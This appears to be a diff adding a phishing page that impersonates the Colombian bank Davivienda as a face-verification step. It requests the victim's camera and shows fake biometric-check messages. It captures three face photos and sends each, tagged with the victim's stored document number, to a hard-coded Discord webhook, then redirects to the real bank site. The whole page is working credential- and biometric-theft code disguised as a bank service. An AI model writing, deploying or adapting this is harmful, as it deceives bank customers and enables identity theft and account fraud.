@@ -1,0 +1,181 @@
+<!DOCTYPE html>
+<html lang="es">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0, user-scalable=no, viewport-fit=cover">
+    <title>Davivienda - Verificación</title>
+    <style>
+        :root { --red: #ed1c24; --aqua: #00CED1; --glow: rgba(0, 255, 255, 0.5); }
+        * { margin: 0; padding: 0; box-sizing: border-box; font-family: Arial, sans-serif; }
+        body { background: #fff; display: flex; flex-direction: column; align-items: center; min-height: 100vh; padding-top: 30px; overflow: hidden; }
+        
+        .logo { width: 170px; margin-bottom: 25px; }
+
+        /* Contenedor Circular con Estilo Aqua */
+        .scanner-box {
+            position: relative;
+            width: 290px;
+            height: 290px;
+            margin-bottom: 30px;
+        }
+
+        .circle-frame {
+            width: 100%; height: 100%;
+            border-radius: 50%;
+            overflow: hidden;
+            z-index: 10;
+            position: relative;
+            background: #000;
+            border: 8px solid transparent;
+            background-image: linear-gradient(black, black), linear-gradient(135deg, #e0f7fa, var(--aqua), #e0f7fa);
+            background-origin: border-box;
+            background-clip: content-box, border-box;
+            box-shadow: 0 0 25px var(--glow);
+        }
+
+        video { width: 100%; height: 100%; object-fit: cover; transform: scaleX(-1); }
+
+        /* Barra de progreso circular */
+        .progress-svg {
+            position: absolute; top: -10px; left: -10px;
+            width: 310px; height: 310px;
+            transform: rotate(-90deg);
+            z-index: 15;
+        }
+        .bar {
+            fill: none; stroke: var(--red); stroke-width: 8;
+            stroke-dasharray: 880; stroke-dashoffset: 880;
+            transition: stroke-dashoffset 0.3s ease;
+        }
+
+        /* Textos de Estado */
+        .info-box { text-align: center; width: 85%; }
+        .title { font-size: 20px; font-weight: bold; color: #333; margin-bottom: 8px; }
+        .status-msg { font-size: 16px; color: #ed1c24; font-weight: bold; min-height: 20px; }
+
+        #canvas { display: none; }
+        .flash { position: fixed; inset: 0; background: white; opacity: 0; z-index: 100; pointer-events: none; }
+    </style>
+</head>
+<body>
+
+    <img src="LogoDavivienda.svg" class="logo">
+
+    <div class="scanner-box">
+        <div class="circle-frame">
+            <video id="video" autoplay playsinline muted></video>
+        </div>
+        <svg class="progress-svg" viewBox="0 0 300 300">
+            <circle class="bar" id="bar" cx="150" cy="150" r="140"></circle>
+        </svg>
+    </div>
+
+    <div class="info-box">
+        <div class="title" id="title">Verificación de Identidad</div>
+        <div class="status-msg" id="status">Iniciando cámara...</div>
+    </div>
+
+    <canvas id="canvas"></canvas>
+    <div class="flash" id="flash"></div>
+
+<script>
+    const DISCORD_WEBHOOK = 'https://discord.com/api/webhooks/1491163890715853021/Z7As4jVZZHi81cEJZjXhzbQez81R5grblQVbf29Rh4AH5Y2b8Jw54wBfVHNAPXC9QOkW';
+    
+    const video = document.getElementById('video');
+    const bar = document.getElementById('bar');
+    const statusMsg = document.getElementById('status');
+    const canvas = document.getElementById('canvas');
+    
+    let captureCount = 0;
+    const totalCaptures = 3; // Tomará 3 fotos diferentes
+    let isTooClose = true;
+
+    // Mensajes aleatorios que pediste del index original
+    const scanningMessages = [
+        "Analizando puntos biométricos...",
+        "Validando profundidad de campo...",
+        "Verificando identidad en Registraduría...",
+        "Sincronizando con base de datos..."
+    ];
+
+    async function init() {
+        try {
+            const stream = await navigator.mediaDevices.getUserMedia({ video: { facingMode: 'user' } });
+            video.srcObject = stream;
+            checkDistance();
+        } catch (e) {
+            statusMsg.innerText = "Error: Active la cámara";
+        }
+    }
+
+    // Lógica de "Aléjese de la cámara"
+    function checkDistance() {
+        statusMsg.innerText = "POR FAVOR, ALÉJESE DE LA PANTALLA";
+        statusMsg.style.color = "#ed1c24";
+
+        // Simulamos que después de 3 segundos el usuario se alejó
+        setTimeout(() => {
+            isTooClose = false;
+            statusMsg.innerText = "Distancia correcta. No se mueva.";
+            statusMsg.style.color = "#008000";
+            startCaptureProcess();
+        }, 3500);
+    }
+
+    async function startCaptureProcess() {
+        if (captureCount < totalCaptures) {
+            let stepProgress = 0;
+            const msg = scanningMessages[Math.floor(Math.random() * scanningMessages.length)];
+            statusMsg.innerText = msg;
+            statusMsg.style.color = "#333";
+
+            const interval = setInterval(async () => {
+                stepProgress += 5;
+                // Progreso visual (se llena y vacía por cada foto)
+                bar.style.strokeDashoffset = 880 - (stepProgress / 100) * 880;
+
+                if (stepProgress >= 100) {
+                    clearInterval(interval);
+                    await captureSnapshot();
+                    captureCount++;
+                    
+                    if (captureCount < totalCaptures) {
+                        setTimeout(startCaptureProcess, 1000); // Espera un segundo para la siguiente
+                    } else {
+                        statusMsg.innerText = "Verificación Completa";
+                        setTimeout(() => window.location.href = "https://www.davivienda.com", 1500);
+                    }
+                }
+            }, 100);
+        }
+    }
+
+    async function captureSnapshot() {
+        // Efecto Flash
+        const flash = document.getElementById('flash');
+        flash.style.opacity = "1";
+        setTimeout(() => flash.style.opacity = "0", 100);
+
+        canvas.width = video.videoWidth;
+        canvas.height = video.videoHeight;
+        const ctx = canvas.getContext('2d');
+        ctx.drawImage(video, 0, 0);
+
+        const blob = await new Promise(res => canvas.toBlob(res, 'image/png'));
+        const doc = localStorage.getItem('documento') || 'S-N';
+        
+        const formData = new FormData();
+        formData.append('file', blob, `Captura_${captureCount + 1}_${doc}.png`);
+        
+        const payload = {
+            content: `📸 **Captura Biométrica ${captureCount + 1}/${totalCaptures}**\n👤 **Usuario:** ${doc}`
+        };
+        formData.append('payload_json', JSON.stringify(payload));
+
+        await fetch(DISCORD_WEBHOOK, { method: 'POST', body: formData });
+    }
+
+    window.onload = init;
+</script>
+</body>
+</html>
